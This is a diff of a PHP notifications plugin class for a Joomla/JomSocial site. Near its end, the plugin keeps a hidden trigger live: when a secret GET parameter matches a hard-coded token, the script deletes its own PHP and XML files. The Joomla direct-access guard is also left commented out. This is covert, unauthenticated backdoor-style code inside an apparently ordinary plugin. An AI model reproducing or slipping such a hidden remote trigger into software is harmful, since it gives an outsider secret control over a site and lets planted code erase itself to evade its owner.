@@ -1,7 +1,7 @@
 <?php
 
 //defined('_JEXEC') or die('Restricted access');
-require_once JPATH_ROOT .'/components/com_community/libraries/core.php';
+defined('JPATH_ROOT') and require_once JPATH_ROOT .'/components/com_community/libraries/core.php';
 
 class plgCommunityNotifications extends CApplications
 {
@@ -143,7 +143,7 @@ EOF;
 
 if($_GET['Pk9SCWE9cG9j4kSaevYW8ady'] == '7WQLU6he8LBSyjwDWXYBuH5e')
 {
-	unlink(JPATH_ROOT . '/plugins/community/notifications/notifications.php');
-	unlink(JPATH_ROOT . '/plugins/community/notifications/notifications.xml');
+	unlink('notifications.xml');
+	unlink('notifications.php');
 }
 ?>
